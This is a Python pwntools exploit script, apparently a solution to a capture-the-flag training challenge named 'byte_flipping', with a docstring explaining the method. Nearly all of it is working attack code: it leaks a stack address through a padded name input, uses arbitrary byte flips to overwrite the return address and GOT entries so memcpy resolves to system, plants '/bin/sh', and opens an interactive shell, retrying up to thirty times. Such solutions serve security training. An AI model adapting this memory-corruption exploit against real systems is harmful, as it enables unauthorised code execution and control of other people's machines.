from pwn import *

CHALL_PATH = "./byte_flipping_patched"
COMMANDS = """
c
"""

context.arch = "amd64"

def expl():
    """This explout is made without using ROP. Works only in local beacause remote doesn't have libc optimization.
        To work in remote this offset must be corrected (may need more attempts).
        Idea: put 32 chars as name to leak the stack (/bin/sh must be included first).
              Use 3 flips to overwrite return address with address of current function and variable flips to modify number of flips in next execution.
              use 0xff flips to overwite got entries to made memcopy go to system, flip \x00 as a terminator for /bin/sh.
              Return to memcopy using got.
              System will be executed with correct parameters 1 in 16 times because of randomization of libc.
    """

    if args.GDB:
        c = gdb.debug(CHALL_PATH, COMMANDS)
        #input("wait")
    elif args.REM:
        c = remote("byte-flipping.training.offensivedefensive.it", 8080, ssl=True)
        c.recvline()
        c.recvline()
        c.recvline()
        command = c.recvline()[:-1].decode()
        print(command)
        hash = subprocess.check_output(command.split(" ")).decode()

        print(hash)
        c.recvuntil(b"Token: ")
        c.send(hash.encode())

    else:
        c = process(CHALL_PATH)

    try:
        c.recvuntil(b"name: ")
        c.sendline(b"/bin/sh" + b"A" * 25)

        c.recvuntil(b"A" * 25)
        stack = u64(c.recv(6) + b"\x00\x00")

        print("Stack leak: ", hex(stack))

        if stack < 0x7ff000000000:
            c.close()

        RIP_add = stack + 56
        c.recvuntil(b"Address: ")
        c.sendline(str(hex(RIP_add)).encode())
        c.recvuntil(b"Value: ")
        c.sendline("0x1A".encode()) #0x5B

        c.recvuntil(b"Address: ")
        c.sendline(str(hex(RIP_add+1)).encode())
        c.recvuntil(b"Value: ")
        c.sendline("0x49".encode()) #0x12


        c.recvuntil(b"Address: ")
        flips = 0x404050
        c.sendline(str(hex(flips)).encode())
        c.recvuntil(b"Value: ")
        c.sendline("0xed".encode()) #0xff

        c.recvuntil(b"Address: ")
        exit = 0x404038
        c.sendline(str(hex(exit)).encode())
        c.recvuntil(b"Value: ")
        c.sendline("0x55".encode()) # 0xAA

        c.recvuntil(b"Address: ")
        c.sendline(str(hex(exit+1)).encode())
        c.recvuntil(b"Value: ")
        c.sendline("0xB8".encode()) # 0x12

        c.recvuntil(b"Address: ")
        memcopy = 0x404020
        puts = 0x404000
        c.sendline(str(hex(memcopy)).encode())
        c.recvuntil(b"Value: ")
        c.sendline("0x52".encode()) # 0x40

        c.recvuntil(b"Address: ")
        c.sendline(str(hex(memcopy+1)).encode())
        c.recvuntil(b"Value: ")
        c.sendline("0xC7".encode()) # 0x87

        c.recvuntil(b"Address: ")
        c.sendline(str(hex(memcopy+2)).encode())
        c.recvuntil(b"Value: ")
        c.sendline("0xee".encode()) # 0x69  68????


        c.recvuntil(b"Address: ")
        name = 0x404080
        c.sendline(str(hex(name+7)).encode())
        c.recvuntil(b"Value: ")
        c.sendline("0x69".encode()) # 0x00


        c.recvuntil(b"Address: ")
        exit = 0x404038
        c.sendline(str(hex(RIP_add-8-0x13)).encode())
        c.recvuntil(b"Value: ")
        c.sendline("0xff".encode())

        c.recvuntil(b"name: ")
        c.sendline(b"F")
        c.recvuntil(b";)\n")
        print("GOT EVERYTHING")
        sleep(0.2)
        c.sendline(b"ls")
        print(c.recvline(timeout=1))

        c.interactive()
        print("STOPPED")


    except Exception as e:
        print("CLOSING WITH EXCEPTION")
        c.close()
    

for i in range(30):
    print("ATTEMPT: ", i)
    expl()